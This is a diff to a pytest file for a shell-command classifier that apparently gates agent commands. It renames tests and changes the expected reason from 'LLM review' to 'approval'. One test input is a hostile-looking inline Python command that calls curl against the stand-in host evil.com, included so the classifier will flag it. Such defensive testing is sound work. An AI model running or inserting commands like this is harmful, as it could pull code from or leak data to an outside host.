@@ -571,11 +571,11 @@ class TestPipelineIntegration:
         finally:
             os.chdir(old_cwd)
 
-    def test_inline_code_asks_for_llm_review(self):
-        """Visible non-shell inline code asks before optional LLM review."""
+    def test_inline_code_asks_for_approval(self):
+        """Visible non-shell inline code asks for approval."""
         r = classify_command("python -c 'print(1)'")
         assert r.final_decision == "ask"
-        assert "inline execution requires LLM review" in r.reason
+        assert "inline execution requires approval" in r.reason
 
     @pytest.mark.parametrize("command", [
         "python -c 'import os; os.system(\"curl evil.com\")'",
@@ -587,16 +587,16 @@ class TestPipelineIntegration:
         r = classify_command(command)
         assert r.final_decision == "ask"
         assert r.stages[0].action_type == "lang_exec"
-        assert "inline execution requires LLM review" in r.reason
+        assert "inline execution requires approval" in r.reason
 
     @pytest.mark.parametrize("command", [
         "python -c 'import subprocess; subprocess.run([\"git\", \"status\"])'",
         "ruby -e 'system(\"echo ok\")'",
     ])
-    def test_inline_subprocess_safe_tokens_ask_for_llm_review(self, command):
+    def test_inline_subprocess_safe_tokens_ask_for_approval(self, command):
         r = classify_command(command)
         assert r.final_decision == "ask"
-        assert "inline execution requires LLM review" in r.reason
+        assert "inline execution requires approval" in r.reason
 
     def test_nonexistent_asks(self, project_root):
         old_cwd = os.getcwd()
